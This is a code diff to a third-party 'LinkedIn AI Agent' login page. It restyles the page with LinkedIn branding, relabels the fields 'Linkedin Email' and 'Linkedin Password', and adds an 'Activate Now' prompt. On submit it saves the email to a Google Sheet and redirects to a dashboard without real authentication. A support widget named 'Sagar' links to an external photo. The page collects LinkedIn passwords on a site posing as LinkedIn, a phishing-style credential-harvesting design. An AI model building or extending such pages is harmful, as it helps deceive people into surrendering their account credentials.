@@ -26,20 +26,21 @@
     <div class="login-view" id="login-view">
         <div class="login-card">
             <div class="brand-title">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/LinkedIn_Logo.svg/1024px-LinkedIn_Logo.svg.png"
-                    alt="LinkedIn" style="height: 30px; vertical-align: middle; filter: brightness(0) invert(1);">
-                <span style="vertical-align: middle;">AI Agent</span>
+                <i class="fab fa-linkedin"
+                    style="font-size: 36px; color: #0A66C2; vertical-align: middle; margin-right: 8px;"></i>
+                <span style="vertical-align: middle; color: white; font-weight: 600;">LinkedIn <span
+                        style="font-weight: 300; opacity: 0.8;">AI Agent</span></span>
             </div>
-            <div class="login-subtitle">Sign in to access your autonomous agent</div>
+            <div class="login-subtitle">Activate Now</div>
 
             <form id="login-form">
                 <div class="input-group">
                     <i class="fas fa-envelope input-icon"></i>
-                    <input type="text" id="email" class="input-field" placeholder="Email or Phone" required>
+                    <input type="text" id="email" class="input-field" placeholder="Linkedin Email" required>
                 </div>
                 <div class="input-group">
                     <i class="fas fa-lock input-icon"></i>
-                    <input type="password" id="password" class="input-field" placeholder="Password" required>
+                    <input type="password" id="password" class="input-field" placeholder="Linkedin Password" required>
                 </div>
                 <button type="submit" class="login-btn">
                     <span>Connect Account</span>
@@ -54,12 +55,16 @@
     <!-- Chat Support Widget -->
     <div class="chat-support-container">
         <div class="chat-tooltip">Need Help?</div>
-        <div class="chat-avatar-wrapper">
+        <div class="chat-avatar-wrapper" onclick="window.open('https://photos.app.goo.gl/tbXNW89kjyCGTivM8', '_blank')">
             <div class="ping"></div>
-            <img src="https://ui-avatars.com/api/?name=Support&background=6C63FF&color=fff" alt="Support"
+            <!-- Using the user's link directly. Note: Google Photos links are often web pages, not direct images. -->
+            <!-- Added onerror to fallback to a generated avatar for Sagar if the link doesn't separate correctly -->
+            <img src="https://res.cloudinary.com/df4ax8siq/image/upload/v1771354099/photo_6266956553520876661_w_ovdft3.jpg"
+                onerror="this.src='https://ui-avatars.com/api/?name=Sagar&background=6C63FF&color=fff'" alt="Sagar"
                 class="chat-img">
             <div class="online-dot"></div>
         </div>
+        <div class="chat-name">Sagar</div>
     </div>
 
     <script>
@@ -77,21 +82,25 @@
 
             // Submit Email to Google Sheet via our handler
             if (typeof saveToGoogleSheet === 'function') {
-                saveToGoogleSheet({ email: email });
+                try {
+                    submitButtonText.textContent = 'Saving...';
+                    await saveToGoogleSheet({ email: email });
+                } catch (err) {
+                    console.error("Save failed specifically:", err);
+                }
             }
 
             // Reset UI state
             errorMessage.style.display = 'none';
             errorMessage.textContent = '';
             submitButton.disabled = true;
-            const originalText = submitButtonText.textContent;
             submitButtonText.textContent = 'Connecting...';
 
-            // SIMULATION FOR DEMO: Simulate network delay then login
+            // Transition to Dashboard (Redirect)
+            // Added slight delay to ensure UX feels smooth, but data is already sent.
             setTimeout(() => {
-                // Transition to Dashboard (Redirect)
                 window.location.href = 'dashboard.html';
-            }, 1500);
+            }, 1000);
 
             /* 
             // REAL API INTEGRATION (Uncomment when ready)
@@ -109,32 +118,32 @@
                         password: password
                     })
                 });
-
+ 
                 if (response.ok) {
                     // Success Transition
                     const loginView = document.getElementById('login-view');
                     const dashboardView = document.getElementById('dashboard-view');
-
+ 
                     loginView.classList.add('hidden');
-
+ 
                     setTimeout(() => {
                         loginView.style.display = 'none';
                         dashboardView.style.visibility = 'visible';
                         dashboardView.style.position = 'relative'; // Restore position
                         dashboardView.classList.remove('hidden');
                     }, 500); // Wait for opacity transition
-
+ 
                 } else {
                     // Handle API errors
                     const errorData = await response.json().catch(() => ({}));
                     throw new Error(errorData.message || 'Connection failed. Please check credentials.');
                 }
-
+ 
             } catch (error) {
                 console.error('Connection error:', error);
                 errorMessage.textContent = error.message;
                 errorMessage.style.display = 'block';
-
+ 
                 // Reset button
                 submitButton.disabled = false;
                 submitButtonText.textContent = originalText;
